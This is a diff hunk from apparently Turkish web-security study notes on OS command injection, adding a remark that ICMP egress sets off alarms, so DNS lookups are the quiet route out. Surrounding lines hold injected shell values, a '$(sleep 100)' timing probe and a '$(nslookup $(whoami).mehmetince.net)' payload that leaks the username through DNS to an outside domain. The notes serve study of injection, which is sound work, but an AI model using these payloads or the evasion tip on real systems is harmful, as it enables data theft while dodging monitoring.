@@ -40,6 +40,7 @@ echo BENIM ADIM "MEHMET $(sleep 100) INCE"
     - nslookup google.com
     - Bu komut çalıştırıldığında sistemdeki default name server ne ise ona gider. Oradan root DNS’e gider, sonrasında senin dns sunucuna gelir ve loglarında görmeye başlarsın.
     - echo BENIM ADIM ‘MEHMET ‘$(nslookup $(whoami).mehmetince.net)’ INCE’
+    - Bir sunucudan ICMP paketi ile çıkmaya çalıştığında bütün alarmlar halaya kalkar. Tek yapabileceğin şey nslookup ile işletim sisteminin defaultundaki DNS'e gitmektir.
 ![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/a40e07ea-597d-4aee-9a09-0200c210a831)
 - whoami içinde boşluk, değişik karakterler falan olmamalı. Domain, RFC protokolüne uygun bir şeyler olması lazım.
 ## Lab: OS Command Injection, Simple Case
